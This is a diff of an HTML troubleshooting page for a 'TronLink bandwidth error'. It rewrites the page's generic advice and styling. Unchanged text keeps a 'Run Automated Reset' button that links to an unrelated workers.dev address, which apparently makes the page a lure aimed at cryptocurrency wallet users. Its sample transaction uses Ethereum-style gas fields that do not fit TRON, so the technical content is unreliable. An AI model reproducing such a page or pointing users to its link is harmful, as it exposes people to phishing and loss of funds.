@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
+        font-family: sans-serif;
         background: #121214;
         color: #ddd;
         padding: 20px;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff9455;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,34 +41,35 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network using TronLink, a popular browser extension and wallet.</li>
+<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network, resulting in failed transactions and inability to execute desired actions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth on the user's TRON account, which is required for transactions and smart contract interactions. On the TRON network, bandwidth is a resource that measures the amount of data a user can send or receive within a certain period.</li>
+<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to process transactions and execute smart contracts on the network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase TRON Power (TP) by freezing TRX tokens to obtain more bandwidth.</li>
-<li>Check for any pending transactions that may be consuming bandwidth and cancel them if necessary.</li>
-<li>Adjust the transaction parameters to optimize bandwidth usage, as shown in the following code block:</li>
+<li>Increase the account's bandwidth by freezing TRX tokens for a specified period.</li>
+<li>Adjust the transaction parameters to require less bandwidth, such as reducing the transaction size or gas limit.</li>
+<li>Utilize a bandwidth delegation feature, if available, to borrow bandwidth from another account:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_address&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_account&quot;</span><span class="p">,</span>
 <span class="w">    </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;contract_address&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;transaction_value&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;bandwidthLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;10000&quot;</span>
+<span class="w">    </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10000</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console to execute these commands for more flexibility and control. </p>
+<p>Consider utilizing a separate console for more advanced troubleshooting. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A TRON account with a sufficient balance of TRX tokens.</li>
-<li>The TronLink browser extension installed and configured.</li>
-<li>A basic understanding of TRON network resources, including bandwidth and TRON Power.</li>
+<li>A TRON account with a positive balance of TRX tokens.</li>
+<li>A basic understanding of TRON's transaction mechanics and resource management.</li>
+<li>The latest version of TronLink wallet installed and configured.</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
